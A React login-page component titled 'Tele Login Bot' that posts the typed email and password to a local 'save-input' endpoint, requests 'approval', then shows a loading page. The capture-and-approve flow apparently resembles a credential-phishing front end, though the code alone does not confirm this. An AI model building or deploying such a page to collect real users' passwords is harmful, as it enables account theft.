import React, { useState } from 'react';
import '../styles/login.css';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';

function LoginPage() {

    const[email, setEmail] = useState('');
    const[password, setPassword] = useState('');
    const navigate = useNavigate();
    const API = process.env.REACT_APP_API_URL;

    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData();
        formData.append('email', email);
        formData.append('password', password)

        try {
            await axios.post('http://localhost:1000/save-input', formData, {
                headers: {
                    "Content-Type" : 'multipart/form-data',
                },
            });
            await axios.post('http://localhost:1000/request-approval');
            navigate('/loading')
        }
        catch(error){
            console.error('Error submitting form', error);
        }
    };

    const togglePassword = () => {
        const passwordInput = document.getElementById("password");
        const showPasswordText = document.querySelector(".show-password-button");

        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            showPasswordText.textContent = "Hide";
        } else {
            passwordInput.type = "password";
            showPasswordText.textContent = "Show";
        }
    };

    return (
        <div className='login-container'>
            <div className="container-left">
            <form className="login-form" method="post" onSubmit={handleSubmit}>
                <div>Log in to <span className='credit'>Tele Login Bot</span></div>
                <label htmlFor="email">Email</label>
                <input id="email" type="email" placeholder="Enter email address" name="email" value={email} onChange={(e) => setEmail(e.target.value)} required />
                
                <label htmlFor="password">Password</label>
                <div className="password-container">
                    <input id="password" type="password" placeholder="Enter password" name="password" value={password} onChange={(e) => setPassword(e.target.value)} required />
                    <span className="show-password-button" onClick={togglePassword}><p className='imshow'>Show</p></span>
                </div>
                
                <input id="submit" type="submit" name="submit" value="Log in" />
            </form>
            </div>

            <div className="container-right">
                <div className="desc-container">
                    <img className="title-icon" src="../assets/title.png" alt="Title" />
                    <div className="desc">
                        <img src="../assets/icon-card.png" alt="Icon Card" />
                        <div className="text-1">Effortless and Secure Access</div>
                        <div className="text-2">
                            Login easily with a secure process that keeps you connected and protected.
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default LoginPage;
